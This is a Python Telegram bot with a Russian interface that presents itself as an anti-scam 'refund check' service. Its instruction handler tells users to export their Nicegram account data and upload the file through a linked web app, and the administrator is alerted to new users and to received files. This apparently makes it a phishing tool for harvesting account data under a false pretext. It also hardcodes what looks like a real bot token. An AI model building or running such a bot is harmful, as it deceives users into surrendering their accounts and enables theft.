import asyncio
import logging
import sqlite3
import datetime
import os
from pathlib import Path

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import (
    Message,
    CallbackQuery,
    FSInputFile,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    WebAppInfo,
)

logging.basicConfig(level=logging.INFO)

# Config from env (Railway)
TOKEN = os.getenv("8371778406:AAGyZlx_5bnmDIpuHzuHboHVa5mXBDWZbMQ")
ADMIN_ID = int(os.getenv("ADMIN_ID", "7225974704"))
WEBAPP_URL = os.getenv("WEBAPP_URL", "https://nicegram-webapp.vercel.app")

if not TOKEN:
    raise RuntimeError("BOT_TOKEN is not set")
if ADMIN_ID == 0:
    logging.warning("ADMIN_ID is not set or invalid (ADMIN_ID=0). Admin notifications will fail.")

router = Router()
dp = Dispatcher()
dp.include_router(router)

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))

# FSM states
class AdminStates(StatesGroup):
    waiting_for_queue_number = State()

class SupportStates(StatesGroup):
    waiting_for_support_message = State()

support_messages: dict[int, int] = {}

# --- DB ---
DB_PATH = "bot_database.db"

def init_database():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute(
        "CREATE TABLE IF NOT EXISTS users ("
        "user_id INTEGER PRIMARY KEY,"
        "username TEXT,"
        "first_name TEXT,"
        "first_seen DATETIME,"
        "last_seen DATETIME"
        ")"
    )
    conn.commit()
    conn.close()

def check_first_time_user(user_id: int) -> bool:
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT 1 FROM users WHERE user_id = ?", (user_id,))
    row = cur.fetchone()
    conn.close()
    return row is None

def add_new_user(user_id: int, username: str | None, first_name: str | None):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cur.execute(
        "INSERT OR REPLACE INTO users (user_id, username, first_name, first_seen, last_seen) "
        "VALUES (?, ?, ?, ?, ?)",
        (user_id, username, first_name, now, now),
    )
    conn.commit()
    conn.close()

def update_last_seen(user_id: int):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cur.execute("UPDATE users SET last_seen = ? WHERE user_id = ?", (now, user_id))
    conn.commit()
    conn.close()

async def send_first_start_to_admin(user_id: int, username: str | None, first_name: str | None):
    if ADMIN_ID == 0:
        return
    try:
        await bot.send_message(
            ADMIN_ID,
            "👤 <b>ПЕРВЫЙ ЗАПУСК бота</b>\n\n"
            f"🆕 <b>Пользователь:</b> @{username or 'нет'}\n"
            f"🆔 <b>ID:</b> {user_id}\n"
            f"👤 <b>Имя:</b> {first_name or 'нет'}",
        )
    except Exception as e:
        logging.exception("Ошибка отправки админу: %s", e)

# --- Keyboards ---
def get_main_menu() -> InlineKeyboardMarkup:
    url = WEBAPP_URL if WEBAPP_URL else "https://example.com"

    keyboard = [
        [InlineKeyboardButton(text="📖 Инструкция", callback_data="instruction")],
        [InlineKeyboardButton(text="📲 Скачать Nicegram", url="https://nicegram.app/")],
        [InlineKeyboardButton(text="🔍 Проверка на рефаунд", web_app=WebAppInfo(url=url))],
        [InlineKeyboardButton(text="🆘 Поддержка", callback_data="support")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_back_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]]
    )

def get_instruction_keyboard() -> InlineKeyboardMarkup:
    return get_back_keyboard()

def get_support_keyboard() -> InlineKeyboardMarkup:
    return get_back_keyboard()

# --- Handlers ---
@router.message(CommandStart())
async def cmd_start(message: Message):
    user = message.from_user
    if user is None:
        return

    if check_first_time_user(user.id):
        await send_first_start_to_admin(user.id, user.username, user.first_name)
        add_new_user(user.id, user.username, user.first_name)
    else:
        update_last_seen(user.id)

    caption = (
        "Привет! Я — бот, который поможет тебе не попасться на мошенников.\n\n"
        "Выбери действие:"
    )

    if Path("1.png").exists():
        await message.answer_photo(photo=FSInputFile("1.png"), caption=caption, reply_markup=get_main_menu())
    else:
        await message.answer(caption, reply_markup=get_main_menu())

@router.callback_query(F.data == "instruction")
async def instruction_handler(callback: CallbackQuery):
    text = (
        "<b>📖 Инструкция:</b>\n\n"
        "1. Скачайте приложение Nicegram.\n"
        "2. Экспортируйте данные аккаунта.\n"
        "3. В меню бота нажмите «🔍 Проверка на рефаунд».\n"
        "4. Загрузите файл в открывшееся окно."
    )

    if callback.message:
        if callback.message.caption is not None:
            await callback.message.edit_caption(caption=text, reply_markup=get_instruction_keyboard())
        else:
            await callback.message.edit_text(text, reply_markup=get_instruction_keyboard())
    await callback.answer()

@router.callback_query(F.data == "support")
async def support_handler(callback: CallbackQuery, state: FSMContext):
    user = callback.from_user
    if not callback.message or user is None:
        await callback.answer()
        return

    msg = await callback.message.answer(
        "🆘 <b>Обращение в поддержку</b>\n\nНапишите ваше сообщение.",
        reply_markup=get_back_keyboard(),
    )
    support_messages[user.id] = msg.message_id
    await state.set_state(SupportStates.waiting_for_support_message)
    await callback.answer()

@router.message(SupportStates.waiting_for_support_message)
async def process_support_message(message: Message, state: FSMContext):
    user = message.from_user
    if user is None:
        return

    if user.id in support_messages:
        try:
            await bot.delete_message(chat_id=user.id, message_id=support_messages[user.id])
        except Exception:
            pass
        support_messages.pop(user.id, None)

    if ADMIN_ID != 0:
        await bot.send_message(
            ADMIN_ID,
            f"🆘 <b>Сообщение в поддержку от</b> @{user.username or 'нет'} (ID: {user.id}):\n\n"
            f"{message.text or 'Вложение'}",
        )

    await message.answer("✅ Сообщение отправлено администратору.", reply_markup=get_support_keyboard())
    await state.clear()

@router.callback_query(F.data == "back_to_main")
async def back_to_main_handler(callback: CallbackQuery):
    caption = (
        "Привет! Я — бот, который поможет тебе не попасться на мошенников.\n\n"
        "Выбери действие:"
    )

    if not callback.message:
        await callback.answer()
        return

    try:
        if Path("1.png").exists():
            if callback.message.caption is not None:
                await callback.message.edit_caption(caption=caption, reply_markup=get_main_menu())
            else:
                await callback.message.delete()
                await callback.message.answer_photo(
                    photo=FSInputFile("1.png"),
                    caption=caption,
                    reply_markup=get_main_menu(),
                )
        else:
            if callback.message.caption is not None:
                await callback.message.delete()
                await callback.message.answer(caption, reply_markup=get_main_menu())
            else:
                await callback.message.edit_text(caption, reply_markup=get_main_menu())
    except Exception:
        await callback.message.answer(caption, reply_markup=get_main_menu())

    await callback.answer()

# Handler for "✅ Принято" sent by Vercel to admin
@router.callback_query(F.data.startswith("ack_"))
async def ack_handler(callback: CallbackQuery):
    parts = callback.data.split("_", 1)
    user_id = parts[1] if len(parts) > 1 else ""
    await callback.answer(f"Вы подтвердили получение файла от {user_id}")

    if callback.message:
        try:
            await callback.message.edit_reply_markup(reply_markup=None)
        except Exception:
            pass

    try:
        await bot.send_message(int(user_id), "✅ Ваш файл успешно получен администратором и находится на проверке.")
    except Exception:
        pass

async def main():
    init_database()
    await bot.delete_webhook(drop_pending_updates=True)

    if ADMIN_ID != 0:
        try:
            await bot.send_message(ADMIN_ID, "🤖 Бот запущен (Railway)!")
        except Exception:
            pass

    logging.info("Bot started…")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
